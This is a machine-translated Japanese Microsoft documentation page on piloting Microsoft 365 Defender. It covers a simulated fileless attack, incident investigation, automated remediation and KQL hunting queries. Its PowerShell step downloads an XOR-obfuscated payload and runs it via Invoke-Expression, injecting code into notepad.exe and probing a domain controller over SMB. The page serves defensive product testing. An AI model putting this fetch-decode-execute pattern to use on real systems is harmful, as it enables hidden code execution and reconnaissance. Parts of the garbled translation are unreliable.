---
title: 攻撃シミュレーションMicrosoft 365 Defender実行する
description: パイロット プロジェクトに対してMicrosoft 365 Defenderシミュレーションを実行して、展開方法と迅速な修復方法を確認します。
keywords: Microsoft 365 Defenderパイロット攻撃シミュレーションの実行、Microsoft 365 Defender パイロット攻撃シミュレーションの実行、Microsoft 365 Defender、Microsoft 365 Defender パイロット プロジェクト、サイバーセキュリティ、高度な永続的脅威、エンタープライズ セキュリティ、デバイス、デバイス、ID、ユーザー、データ、アプリケーション、インシデント、自動調査と修復、高度な狩猟のシミュレーション
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 07/16/2021
ms.locfileid: "53458432"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>攻撃シミュレーションMicrosoft 365 Defender実行する

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![計画](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[計画](m365d-pilot-plan.md)|[![準備](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[準備](prepare-m365d-eval.md)|![攻撃のシミュレーション](../../media/phase-diagrams/3-simluate.png)<br/>攻撃のシミュレーション|[![閉じて要約する](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[閉じて要約する](m365d-pilot-close.md)|
|--|--|--|--|
|||*お前はここにいる!*||

現在、攻撃シミュレーション フェーズに入っている。

パイロット環境を準備した後、インシデント管理と自動調査と修復機能Microsoft 365 Defenderテストします。 高度な手法を活用して検出を非表示にする高度な攻撃をシミュレートするのに役立ちます。 この攻撃は、ドメイン コントローラーで開いたサーバー メッセージ ブロック (SMB) セッションを列挙し、ユーザーのデバイスの最近の IP アドレスを取得します。 攻撃のこのカテゴリには、通常、被害者のデバイスにドロップされたファイルは含めされません。これらはメモリ内でのみ発生します。 既存のシステムツールと管理ツールを使用して"土地から離れ"、コードをシステム プロセスに挿入して実行を非表示にします。このような動作により、検出を回避し、デバイス上で保持できます。

このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。 ユーザーがスクリプトの実行を騙される可能性があります。 または、以前に感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行される場合があります。攻撃者がネットワーク内で横方向に移動しようとした場合。 管理者は、さまざまな管理アクティビティを実行するためにリモートでスクリプトを実行する場合も多いので、これらのスクリプトの検出が困難になる場合があります。

![プロセスの挿入と SMB の偵察攻撃の図によるファイルレス PowerShell 攻撃](../../media/mtp/mtpdiydiagram.png)

シミュレーション中、攻撃はシェルコードを一見無実のプロセスに挿入します。 このシナリオでは、このシナリオを使用notepad.exe。 シミュレーションではこのプロセスを選択しましたが、攻撃者は長時間実行されるシステム プロセス (たとえば、svchost.exe) をターゲットにしている可能性が高svchost.exe。 その後、シェルコードは攻撃者のコマンド アンド コントロール (C2) サーバーに問い合わせ、続行方法に関する指示を受け取る。 スクリプトは、ドメイン コントローラー (DC) に対する偵察クエリの実行を試みます。 偵察により、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。 攻撃者がこの情報を取得すると、ネットワーク内を横方向に移動して、特定の機密性の高いアカウントにアクセスできます。

> [!IMPORTANT]
> 最適な結果を得る場合は、可能な限り攻撃シミュレーションの指示に従ってください。

## <a name="simulation-environment-requirements"></a>シミュレーション環境の要件

準備フェーズ中にパイロット環境が既に構成済みである場合は、このシナリオに 2 つのデバイス (テスト デバイスとドメイン コントローラー) が存在するようにします。

1. テナントが有効になっている[Microsoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)

2. テスト ドメイン コントローラーの構成を確認します。

   - デバイスは、Windows Server 2008 R2 以降のバージョンで実行されます。
   - Microsoft Defender for Identity へのテスト ドメイン コントローラー [で、](/azure/security-center/security-center-wdatp) リモート管理 [を有効にします](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - Microsoft [Defender for Identity and Microsoft Cloud App Securityが有効](/cloud-app-security/mdi-integration)になっているか確認します。
   - テスト ユーザーはドメインに作成されます。管理者のアクセス許可は不要です。

3. テスト デバイスの構成を確認します。

   1. デバイスは、Windows 10バージョン 1903 以降で実行されます。

   1. テスト デバイスはテスト ドメインに参加しています。

   1. [[オンにする] をWindows Defender ウイルス対策](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)します。 問題が発生した場合は、このトラブルシューティング Windows Defender ウイルス対策を[参照してください](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。

   1. テスト デバイスが Microsoft Defender for Endpoint にオンボードされている[のを確認します。](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

既存のテナントを使用してデバイス グループを実装する場合は、テスト デバイス用の専用デバイス グループを作成し、構成 UX で上位レベルにプッシュします。

## <a name="run-the-attack-scenario-simulation"></a>攻撃シナリオのシミュレーションを実行する

攻撃シナリオのシミュレーションを実行するには、次のコマンドを実行します。

1. テスト ユーザー アカウントを使用してテスト デバイスにログインします。

2. テスト デバイスWindows PowerShellウィンドウを開きます。

3. 次のシミュレーション スクリプトをコピーします。

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Web ブラウザーでこのドキュメントを開いた場合、特定の文字を失わずにフル テキストをコピーしたり、改行を追加したりせずに問題が発生する可能性があります。 このドキュメントをダウンロードし、Adobe Reader で開きます。

4. プロンプトで、コピーしたスクリプトを貼り付け、実行します。

> [!NOTE]
> リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は **、CTRL-V** ホットキーまたは右クリック貼り付けメソッドが機能しないので、RDP クライアントで [クリップボード テキストの種類] コマンドを使用します。 PowerShell の最近のバージョンでは、そのメソッドを受け入れれなく場合があります。最初にメモリ内の メモ帳 にコピーし、仮想マシンにコピーしてから PowerShell に貼り付ける必要があります。

数秒後 <i> 、notepad.exe開 </i> きます。 シミュレートされた攻撃コードは、そのコードにnotepad.exe。 完全なシナリオを体験するためにメモ帳自動的に生成されたインスタンスを開いた状態に保ちます。

シミュレートされた攻撃コードは、外部 IP アドレス (C2 サーバーのシミュレート) に通信し、SMB を介してドメイン コントローラーに対する偵察を試みる。

このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

[インシデントと応答の自動化] 機能が動作しているのを確認するには、プロセスを開notepad.exe保持します。 [インシデントと応答の自動停止] プロセスが表示メモ帳表示されます。

## <a name="investigate-an-incident"></a>インシデントの調査

> [!NOTE]
> このシミュレーションを実行する前に、次のビデオを見て、インシデント管理が関連するアラートを調査プロセスの一部としてまとめ、ポータルで見つけ、セキュリティ操作でどのように役立つのかについて説明します。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC アナリストの視点に切り替えて、セキュリティ センター ポータルで攻撃の調査Microsoft 365開始できます。

1. 任意の[デバイスMicrosoft 365セキュリティ センター ポータル インシデント](https://security.microsoft.com/incidents)キューを開きます。

2. メニューから **[インシデント]** に移動します。

    ![セキュリティ センターの左側のMicrosoft 365に表示されるインシデントのスクリーンショット](../../media/mtp/fig1.png)

3. シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。

    ![インシデント キューのスクリーンショット](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>攻撃を 1 つのインシデントとして調査する

Microsoft 365 Defender分析を関連付け、異なる製品のすべての関連するアラートと調査を 1 つのインシデント エンティティに集約します。 これにより、SOC アナリストMicrosoft 365 Defender複雑な脅威を理解して対応できるように、より広範な攻撃ストーリーが表示されます。

このシミュレーション中に生成されたアラートは同じ脅威に関連付けられるので、その結果、1 つのインシデントとして自動的に集計されます。

インシデントを表示するには、次の方法を実行します。

1. インシデント キュー **に移動** します。

   ![ナビゲーション メニューからのインシデントのスクリーンショット](../../media/mtp/fig1.png)

2. インシデント名の左側にある円をクリックして、最新のアイテムを選択します。 サイド パネルには、関連するアラートを含むインシデントに関する追加情報が表示されます。 各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前があります。

   ![シミュレーション中に生成されたアラートが集計されるインシデント ページのスクリーンショット](../../media/mtp/fig4.png)

   ダッシュボードに表示されるアラートは、サービス リソース (Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender、および Microsoft Defender for Office 365 に基づいてフィルター処理できます。

3. インシデント **の詳細を取得するには、[** インシデント ページを開く] を選択します。

   [インシデント **] ページ** では、インシデントに関連するアラートと情報を確認できます。 この情報には、アラートに関連するエンティティとアセット、アラートの検出ソース (Microsoft Defender for Identity、EDR)、およびアラートがリンクされた理由が含まれます。 インシデントアラートリストを確認すると、攻撃の進行状況が表示されます。 このビューから、個々のアラートを確認および調査できます。

   右側のメニューから [ **インシデント** の管理] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。

   ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

   ![インシデントにタグを付け、自分に割り当て、コメントを追加できるインシデント管理パネルのフィールドのスクリーンショット](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>生成されたアラートを確認する

シミュレートされた攻撃中に生成されたアラートの一部を見てみよ。

> [!NOTE]
> シミュレートされた攻撃中に生成されたアラートの一部のみを実行します。 テスト デバイスで実行されている Windowsおよび Microsoft 365 Defender 製品のバージョンによっては、少し異なる順序で表示されるアラートが多く表示される場合があります。

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>アラート: 疑わしいプロセスの挿入が観察されました (ソース: Microsoft Defender for Endpoint EDR)

高度な攻撃者は、高度でステルス性の高い方法を使用してメモリを保持し、検出ツールから隠します。 一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼できるシステム プロセス内から操作し、検出ツールやセキュリティ操作が悪意のあるコードを見つけるのを難しくする方法です。

SOC アナリストがこれらの高度な攻撃をキャッチできるよう、Microsoft Defender for Endpoint のディープ メモリ センサーは、さまざまなクロスプロセス コードインジェクション手法をこれまでにない可視性でクラウド サービスに提供します。 次の図は、Defender for Endpoint がコードを挿入しようとして検出され、警告を受け取った<i>notepad.exe。 </i>

![悪意のある可能性のあるコードの挿入に関する警告のスクリーンショット](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>アラート: コマンド ライン引数を使用しないプロセス実行で予期しない動作が発生する (ソース: エンドポイントの Microsoft Defender EDR)

Microsoft Defender for Endpoint の検出は、攻撃手法の最も一般的な属性をターゲットにしている場合が多い。 このメソッドは、耐久性を確保し、攻撃者が新しい戦術に切り替えるバーを上げる。

大規模な学習アルゴリズムを使用して、組織内および世界中の共通プロセスの通常の動作を確立し、これらのプロセスが異常な動作を示す状況を監視します。 これらの異常な動作は、多くの場合、余分なコードが導入され、それ以外の場合は信頼できるプロセスで実行されている状態を示しています。

このシナリオでは、 <i> プロセスが </i>notepad.exe、外部の場所との通信を伴う異常な動作を示しています。 この結果は、悪意のあるコードの導入と実行に使用される特定のメソッドとは独立しています。

> [!NOTE]
> このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づくため、ポータルでこのアラートが表示されるには時間がかかる場合があります。

アラートの詳細には、調査を展開するピボットとして使用できるインジケーターである外部 IP アドレスが含まれます。

アラート プロセス ツリーで IP アドレスを選択して、[IP アドレスの詳細] ページを表示します。

![コマンド ライン引数を使用しないプロセス実行による予期しない動作に関するアラートのスクリーンショット](../../media/mtp/fig8.png)

次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーの IP アドレスをクリックします)。
![[IP アドレスの詳細] ページのスクリーンショット](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>アラート: ユーザーと IP アドレスの偵察 (SMB) (ソース: Microsoft Defender for Identity)

サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、ネットワークを横方向に移動して特定の機密性の高いアカウントにアクセスするのに役立つ、最近のユーザー ログオン情報を取得できます。

この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。

![ユーザーと IP アドレスの偵察に関する Microsoft Defender for Identity アラートのスクリーンショット](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>デバイスのタイムラインを確認する [Microsoft Defender for Endpoint]

このインシデントのさまざまなアラートを確認した後、前に調査したインシデント ページに戻ります。 インシデント ページ **の [デバイス** ] タブを選択して、Microsoft Defender for Endpoint および Microsoft Defender for Identity によって報告されたこのインシデントに関連するデバイスを確認します。

攻撃が行われたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。 そのページで、トリガーされたアラートと関連イベントを確認できます。

[タイムライン **] タブ** を選択して、デバイスのタイムラインを開き、発生したアラートと一緒にデバイスで観察されたイベントと動作を時系列順に表示します。

![動作を含むデバイスタイムラインのスクリーンショット](../../media/mtp/fig11.png)

より興味深い動作の一部を展開すると、プロセス ツリーなどの有用な詳細が提供されます。

たとえば、警告イベント [疑わしいプロセスの挿入が観察されるまで **下にスクロールします**。 その下 **powershell.exe** プロセス notepad.exeに挿入するイベントを選択し、この動作の完全なプロセス ツリーをサイド ウィンドウの **[イベント** エンティティ] グラフに表示します。 必要に応じて、検索バーを使用してフィルター処理を行います。

![選択した PowerShell ファイル作成動作のプロセス ツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>ユーザー情報を確認する [Microsoft Cloud App Security]

インシデント ページで、[ユーザー] **タブを** 選択して、攻撃に関与するユーザーの一覧を表示します。 この表には、各ユーザーの調査優先度スコアを含む、各ユーザーに関する **追加情報が含** まれている。

ユーザー名を選択して、ユーザーのプロファイル ページを開き、詳細な調査を行います。 [リスクの高いユーザーの調査について詳しくは、以下の記事を参照してください](/cloud-app-security/tutorial-ueba#identify)。

![ユーザー ページCloud App Securityスクリーンショット](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>調査と修復の自動化

> [!NOTE]
>このシミュレーションを実行する前に、次のビデオを見て、自動自己修復とは何か、ポータルでどこで見つけるか、セキュリティ操作でどのように役立つのかを理解してください。

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

セキュリティ センター ポータルでインシデントMicrosoft 365戻します。 [**インシデント] ページの****[調査**] タブには、Microsoft Defender for Identity と Microsoft Defender for Endpoint によってトリガーされた自動調査が表示されます。 次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを表示します。 既定では、Defender for Endpoint はキュー内にあるアーティファクトを自動的に修復します。修復が必要です。

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

調査をトリガーしたアラートを選択して、[調査の詳細] **ページを開** きます。 次の詳細が表示されます。

- 自動調査をトリガーしたアラート。
- 影響を受け取ったユーザーとデバイス。 追加のデバイスでインジケーターが見つかった場合は、これらの追加のデバイスも一覧表示されます。
- 証拠の一覧。 ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。 これらのエンティティは、アラートに対して考えられる関係について分析され、良性または悪意のあると評価されます。
- 脅威が見つかりました。 調査中に検出された既知の脅威。

> [!NOTE]
> タイミングによっては、自動調査がまだ実行されている可能性があります。 証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待ちます。 [調査の **詳細] ページを** 更新して、最新の結果を取得します。

![[調査の詳細] ページのスクリーンショット](../../media/mtp/fig15.png)

自動化された調査の間、Microsoft Defender for Endpoint は修復が必要な成果物の 1 notepad.exeプロセスを特定しました。 Defender for Endpoint は、自動修復の一環として疑わしいプロセスの挿入を自動的に停止します。

テスト デバイス上 <i>notepad.exe</i> プロセスの一覧から表示されなくなります。

## <a name="resolve-the-incident"></a>インシデントを解決する

調査が完了し、修復が確認された後、インシデントを閉じます。

[インシデント **の管理] を選択します**。 状態を [インシデントの解決 **] に設定し** 、関連する分類を選択します。

インシデントが解決すると、セキュリティ センターと関連するポータルMicrosoft 365関連付けられているすべてのアラートが閉じます。

![[インシデントの管理] パネルを開いたインシデント ページのスクリーンショットで、スイッチをクリックしてインシデントを解決できます。](../../media/mtp/fig16.png)

これにより、インシデント管理と自動調査と修復シナリオの攻撃シミュレーションがラップされます。 次のシミュレーションでは、潜在的に悪意のあるファイルに対する予防的な脅威の検出を実行します。

## <a name="advanced-hunting-scenario"></a>高度なハンティング シナリオ

> [!NOTE]
> シミュレーションを実行する前に、次のビデオを見て高度な狩猟の概念を理解し、ポータルで検索できる場所を確認し、セキュリティ操作でどのように役立つのか確認してください。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>ハンティング環境の要件

このシナリオでは、1 つの内部メールボックスとデバイスが必要です。 テスト メッセージを送信するには、外部メール アカウントも必要です。

1. テナントが有効[になっているMicrosoft 365 Defender。](m365d-enable.md#confirm-that-the-service-is-on)
2. 電子メールの受信に使用するターゲット メールボックスを特定します。
    a. このメールボックスは、Microsoft Defender によって監視され、Office 365必要があります。 要件 3 のデバイスは、このメールボックスにアクセスする必要があります
3. テスト デバイスを構成します。a. バージョン 1903 以降Windows 10を使用してください。
    b. テスト デバイスをテスト ドメインに参加します。
    c. [[オンにする] をWindows Defender ウイルス対策](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)します。 問題が発生した場合は、このトラブルシューティング Windows Defender ウイルス対策を[参照してください](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
    d. [エンドポイント用 Microsoft Defender にオンボードします](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

### <a name="run-the-simulation"></a>シミュレーションを実行する

1. 外部メール アカウントから、テスト環境の要件セクションの手順 2 で識別されたメールボックスに電子メールを送信します。 既存の電子メール フィルター ポリシーで許可される添付ファイルを含める。 このファイルは、悪意のあるファイルや実行可能ファイルである必要があります。 推奨されるファイルの種類は<i>、.pdf、.exe</i> <i>(許可</i>されている場合)、または Word ファイルなどのOfficeドキュメントです。
2. テスト環境の要件セクションの手順 3 で定義されているデバイスから送信された電子メールを開きます。 添付ファイルを開くか、ファイルをデバイスに保存します。

#### <a name="go-hunting"></a>Go hunting

1. ポータルを開 security.microsoft.com します。

2. [ハンティング と **高度な>に移動します**。

   ![M365 セキュリティ センター ポータル ナビゲーション バーでの高度な検索のスクリーンショット](../../media/mtp/fig17.png)

3. 電子メール イベントの収集から始まるクエリを作成します。

   1. クエリ ウィンドウで、[新規] を選択します。

   1. スキーマから EmailEvents テーブルをダブルクリックします。

      ```console
      EmailEvents
      ```

   1. 時間枠を過去 24 時間に変更します。 上記のシミュレーションを実行した際に送信したメールが過去 24 時間だったと仮定し、それ以外の場合は時間枠を変更します。

      ![タイム フレームを変更できる場所のスクリーンショット。 ドロップダウン メニューを開き、時間枠のオプションの範囲から選択する](../../media/mtp/fig18.png)

   1. クエリを実行します。 パイロットの環境によっては、多くの結果が得られます。

      > [!NOTE]
      > データの取得を制限するオプションのフィルター処理については、次の手順を参照してください。

      ![高度な検索クエリ結果のスクリーンショット](../../media/mtp/fig19.png)

        > [!NOTE]
        > 高度な検索では、クエリ結果が表形式のデータとして表示されます。 グラフなどの他の形式のデータを表示することもできます。

   1. 結果を確認し、開いたメールを識別できる場合を確認します。 高度な検索でメッセージが表示されるには、最大で 2 時間かかる場合があります。 電子メール環境が大きく、結果が多い場合は、[フィルターの表示]オプションを使用してメッセージを見つける必要があります。

      サンプルでは、メールが Yahoo アカウントから送信されました。 **+**[SenderFromDomain]**セクション** yahoo.com 横にあるアイコンをクリックし、[適用] をクリックして、選択したドメインをクエリに追加します。 [シミュレーションの実行] の手順 1 のテスト メッセージの送信に使用されたドメインまたは電子メール アカウントを使用して、結果をフィルター処理します。 クエリを再度実行して、より小さい結果セットを取得して、シミュレーションからのメッセージが表示されるのを確認します。

      ![フィルターのスクリーンショット。 フィルターを使用して検索を絞り込み、探している検索を速く見つける。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. クエリの結果の行をクリックして、レコードを検査できます。

      ![高度な検索結果が選択されている場合に開く検査レコード側パネルのスクリーンショット](../../media/mtp/fig21.png)

4. メールが表示されるのを確認したので、添付ファイルのフィルターを追加します。 環境内の添付ファイルを含むすべてのメールに焦点を当てる。 このシナリオでは、環境から送信されるメールではなく、受信メールに重点を置きます。 追加したフィルターを削除して、メッセージを見つけて "メッセージ" を追加|AttachmentCount **> 0** と **EmailDirection**  ==  **"Inbound""**

   次のクエリは、すべての電子メール イベントに対する最初のクエリよりも短いリストを持つ結果を表示します。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 次に、添付ファイルに関する情報 (ファイル名、ハッシュなど) を結果セットに含める。 これを行うには **、EmailAttachmentInfo テーブルに参加** します。 参加に使用する一般的なフィールドは **、NetworkMessageId** と **RecipientObjectId です**。

   次のクエリには、追加の行 "| **project-rename EmailTimestamp=Timestamp**" は、次の手順で追加するファイルアクションに関連するタイムスタンプとメールに関連したタイムスタンプを識別するのに役立ちます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 次に **、EmailAttachmentInfo** テーブルの **SHA256** 値を使用して、そのハッシュの **DeviceFileEvents** (エンドポイントで発生したファイル アクション) を検索します。 ここでの共通フィールドは、添付ファイルの SHA256 ハッシュです。

   結果の表には、エンドポイント (Microsoft Defender for Endpoint) の詳細 (デバイス名、実行されたアクション (この場合は FileCreated イベントのみを含むフィルター処理)、ファイルが格納された場所が含まれます。 プロセスに関連付けられたアカウント名も含まれます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   これで、ユーザーが添付ファイルを開いた、または保存した受信メールを識別するクエリを作成しました。 このクエリを絞り込み、特定の送信者ドメイン、ファイル サイズ、ファイルの種類などについてフィルター処理することもできます。

7. 関数は、有病率、署名者、発行者情報などのファイルに関するより多くの TI データを取得できる、特別な種類の結合です。ファイルの詳細を取得するには **、FileProfile() 関数エンリッチメントを** 使用します。

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>検出を作成する

将来発生した場合に通知を受け取る情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。

カスタム検出では、設定した頻度に従ってクエリが実行され、クエリの結果によって、選択した影響を受け取ったアセットに基づいてセキュリティアラートが作成されます。 これらのアラートはインシデントに関連付け、製品の 1 つによって生成される他のセキュリティ アラートとしてトリアージできます。

1. クエリ ページで、Go ハンティング手順の手順 7 で追加された行 7 と 8 を削除し、[検出ルールの作成] **をクリックします**。

   ![高度な検索ページで [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png)

   > [!NOTE]
   > [検出ルール **の作成] を** クリックし、クエリに構文エラーがある場合、検出ルールは保存されません。 クエリをダブルクリックして、エラーがないか確認します。

2. 必要なフィールドに、セキュリティ チームがアラートを理解できる情報、アラートが生成された理由、および必要なアクションを入力します。

   ![アラートの詳細を定義できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig23.png)

   この検出ルールアラートに関する情報に基づいた決定を次のユーザーに提供するために、フィールドに明確な情報を入力してください。

3. このアラートで影響を受け取るエンティティを選択します。 この場合、[デバイスとメールボックス **] を****選択します**。

   ![影響を受け取ったエンティティのパラメーターを選択できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig24.png)

4. アラートがトリガーされた場合に実行するアクションを決定します。 この場合、ウイルス対策スキャンを実行しますが、他の操作を実行できます。

   ![脅威への対処に役立つアラートがトリガーされた場合にウイルス対策スキャンを実行できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig25.png)

5. アラート ルールのスコープを選択します。 このクエリにはデバイスが含まれるので、デバイス グループは Microsoft Defender for Endpoint コンテキストに従って、このカスタム検出に関連します。 影響を受け取ったエンティティとしてデバイスを含めないカスタム検出を作成する場合、スコープは適用されません。

   ![アラート ルールのスコープを設定できる検出ルールの作成ページのスクリーンショットで、表示される結果に対する期待値を管理します。](../../media/mtp/fig26.png)

   このパイロットの場合は、このルールを実稼働環境のテスト デバイスのサブセットに制限できます。

6. [**作成**] を選択します。 次に、ナビゲーション **パネルから [カスタム** 検出ルール] を選択します。

   ![メニューの [カスタム検出ルール] オプションのスクリーンショット](../../media/mtp/fig27a.png)

   ![ルールと実行の詳細を表示する検出ルール ページのスクリーンショット](../../media/mtp/fig27b.png)

   このページから検出ルールを選択すると、詳細ページが開きます。

   ![ルールの実行の状態、トリガーされたアラートとアクション、検出の編集などがある電子メールの添付ファイル ページのスクリーンショット](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>その他の高度な狩猟ウォークスルー演習

高度な検索の詳細については、次の Web キャストで、Microsoft 365 Defender 内の高度な検索機能について説明し、クロスピラー クエリを作成し、エンティティにピボットし、カスタム検出と修復アクションを作成します。

> [!NOTE]
> パイロット テスト ラボ環境でGitHubクエリを実行するには、独自のアカウントを使用して準備してください。

|Title|説明|MP4 をダウンロードする|YouTube で視聴する|使用する CSL ファイル|
|---|---|---|---|---|
|エピソード 1: KQL の基本|高度な狩猟機能の基本について説明します。Microsoft 365 Defender。 使用可能な高度な検索データと基本的な KQL 構文と演算子について説明します。|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[エピソード 1: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|エピソード 2: 参加|高度な検索のデータと、テーブルを一緒に結合する方法について引き続き学習します。 内部、外側、一意、および半結合、および既定の Kusto innerunique 結合のニュアンスについて説明します。|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[エピソード 2: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|エピソード 3: データの要約、ピボット、および視覚化|データのフィルター処理、操作、結合ができたので、データの要約、定量化、ピボット、視覚化を開始します。 このエピソードでは、要約演算子と、高度な狩猟スキーマの追加テーブルに飛び込む間に実行できる計算の一部について説明します。 分析の改善に役立つグラフにデータセットを変換します。|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[エピソード 3: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|エピソード 4: ハントしましょう! インシデント追跡への KQL の適用|攻撃者のアクティビティを追跡する時間! このエピソードでは、攻撃を追跡するために、KQL と高度なMicrosoft 365 Defenderを使用します。 サイバーセキュリティの ABC やインシデント対応に適用する方法など、攻撃者のアクティビティを追跡するためにフィールドで使用されるヒントとコツについて説明します。|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[エピソード 4: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>次の手順

|![閉じると概要のフェーズ](../../media/mtp/close.png) <br>[閉じると概要のフェーズ](m365d-pilot-close.md)|パイロットの結果Microsoft 365 Defender分析し、関係者に提示し、次のステップに進みます。
|:-----|:-----|
